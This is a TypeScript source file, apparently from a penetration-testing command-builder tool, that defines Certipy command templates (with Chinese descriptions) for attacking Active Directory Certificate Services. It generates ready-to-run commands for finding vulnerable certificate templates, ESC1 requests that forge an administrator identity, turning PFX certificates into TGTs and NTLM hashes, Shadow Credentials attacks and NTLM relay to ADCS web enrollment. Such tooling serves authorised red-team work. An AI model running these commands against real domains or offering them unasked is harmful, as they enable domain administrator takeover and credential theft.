import type { Tool } from '../../types';
import { buildCertipyAuth, v } from '../../lib/auth';

export const certipyTools: Tool[] = [
  {
    id: 'certipy-find',
    name: 'certipy find',
    category: 'certipy',
    homepage: 'https://github.com/ly4k/Certipy',
    description: '查找 ADCS 证书模板漏洞 (ESC1-8)',
    commands: [
      {
        id: 'certipy-find-vuln',
        title: '查找漏洞证书模板',
        build: (p) => `${buildCertipyAuth(p, 'find')} -vulnerable -stdout`,
      },
      {
        id: 'certipy-find-all',
        title: '导出所有证书信息到 JSON',
        build: (p) => `${buildCertipyAuth(p, 'find')} -json -output certipy_find`,
      },
    ],
  },
  {
    id: 'certipy-req',
    name: 'certipy req',
    category: 'certipy',
    homepage: 'https://github.com/ly4k/Certipy',
    description: '请求证书 (用于 ESC1/ESC4 等利用)',
    commands: [
      {
        id: 'certipy-req-template',
        title: '申请证书模板',
        build: (p) => `${buildCertipyAuth(p, 'req')} -ca ${v(p.caName, 'CA_NAME')} -template ${v(p.certTemplate, 'TEMPLATE')}`,
      },
      {
        id: 'certipy-req-upn',
        title: 'ESC1 - 申请证书并指定 UPN',
        description: '伪造任意用户 (如域管理员)',
        build: (p) => `${buildCertipyAuth(p, 'req')} -ca ${v(p.caName, 'CA_NAME')} -template ${v(p.certTemplate, 'TEMPLATE')} -upn administrator@${v(p.domain, 'DOMAIN')}`,
      },
      {
        id: 'certipy-req-altname',
        title: 'ESC1 - 使用 -alt 参数伪造用户',
        build: (p) => `${buildCertipyAuth(p, 'req')} -ca ${v(p.caName, 'CA_NAME')} -template ${v(p.certTemplate, 'TEMPLATE')} -alt administrator@${v(p.domain, 'DOMAIN')}`,
      },
    ],
  },
  {
    id: 'certipy-auth',
    name: 'certipy auth',
    category: 'certipy',
    homepage: 'https://github.com/ly4k/Certipy',
    description: '使用证书获取 TGT 或 NTLM 哈希',
    commands: [
      {
        id: 'certipy-auth-pfx',
        title: '使用 PFX 证书获取 TGT 和哈希',
        build: (p) => `certipy auth -pfx administrator.pfx -dc-ip ${v(p.dcIP, 'DC_IP')}`,
      },
      {
        id: 'certipy-auth-ldaps',
        title: '通过 LDAPS 获取凭据',
        build: (p) => `certipy auth -pfx administrator.pfx -dc-ip ${v(p.dcIP, 'DC_IP')} -ldap-shell`,
      },
    ],
  },
  {
    id: 'certipy-shadow',
    name: 'certipy shadow',
    category: 'certipy',
    homepage: 'https://github.com/ly4k/Certipy',
    description: '影子凭据攻击 (Shadow Credentials)',
    commands: [
      {
        id: 'certipy-shadow-auto',
        title: 'Shadow Credentials 自动利用',
        description: '写入 msDS-KeyCredentialLink 并获取 TGT',
        build: (p) => `${buildCertipyAuth(p, 'shadow')} auto -account ${v(p.username, 'TARGET_USER')}`,
      },
      {
        id: 'certipy-shadow-add',
        title: 'Shadow Credentials 添加密钥',
        build: (p) => `${buildCertipyAuth(p, 'shadow')} add -account ${v(p.username, 'TARGET_USER')}`,
      },
    ],
  },
  {
    id: 'certipy-relay',
    name: 'certipy relay',
    category: 'certipy',
    homepage: 'https://github.com/ly4k/Certipy',
    description: 'NTLM Relay 到 ADCS HTTP 端点',
    commands: [
      {
        id: 'certipy-relay-http',
        title: 'Relay 到 ADCS Web Enrollment',
        build: (p) => `certipy relay -target http://${v(p.targetHost, 'CA_HOST')}/certsrv/certfnsh.asp -ca ${v(p.caName, 'CA_NAME')} -template ${v(p.certTemplate, 'TEMPLATE')}`,
      },
    ],
  },
  {
    id: 'certipy-ca',
    name: 'certipy ca',
    category: 'certipy',
    homepage: 'https://github.com/ly4k/Certipy',
    description: '管理证书颁发机构',
    commands: [
      {
        id: 'certipy-ca-list',
        title: '列举所有 CA',
        build: (p) => `${buildCertipyAuth(p, 'ca')} -list`,
      },
    ],
  },
  {
    id: 'certipy-template',
    name: 'certipy template',
    category: 'certipy',
    homepage: 'https://github.com/ly4k/Certipy',
    description: '修改证书模板权限',
    commands: [
      {
        id: 'certipy-template-list',
        title: '列举证书模板',
        build: (p) => `${buildCertipyAuth(p, 'template')} -list`,
      },
    ],
  },
];
